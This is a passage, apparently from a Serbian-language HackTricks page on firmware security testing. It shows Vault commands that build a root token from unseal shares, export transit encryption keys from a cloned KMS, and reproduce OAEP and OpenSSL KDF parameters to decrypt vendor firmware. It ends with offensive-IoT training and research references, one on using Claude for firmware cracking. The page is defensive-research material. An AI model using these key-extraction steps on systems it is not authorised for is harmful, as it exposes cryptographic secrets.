vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Sa root pristupom na kloniranom KMS-u:

- Omogućite izvoz transit ključeva samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ sa tačnim parom padding/hash koji koristi KMS. Neuspešan PKCS#1 v1.5 decrypt i neuspešan podrazumevani OAEP decrypt **ne dokazuju** da je ključ pogrešan; mnogi Vault-backed tokovi koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, tačno reprodukujte vendorov OpenSSL KDF (`EVP_BytesToKey`, često MD5 na legacy appliance uređajima) pre pokušaja AES-CBC decryption.

Ovo pretvara problem „encrypted firmware“ u opštiji problem: **oporavite operational ključeve sa strane appliance uređaja, a zatim offline reprodukujte tačne unwrap + KDF parametre**.

## Obuke i sertifikacije

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware pomoću Claude-a: veština na seniorskom nivou, autonomija na juniorskom nivou](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktični IoT Hacking: Definitivni vodič za napade na Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je Smart Device od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sada me vidiš: sada si Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector uređaja preko konektora za punjenje - 2. deo: zaobilaženje zaštite od downgrade-a](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: Over-the-Air iskorišćavanje Philips Hue Bridge uređaja](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
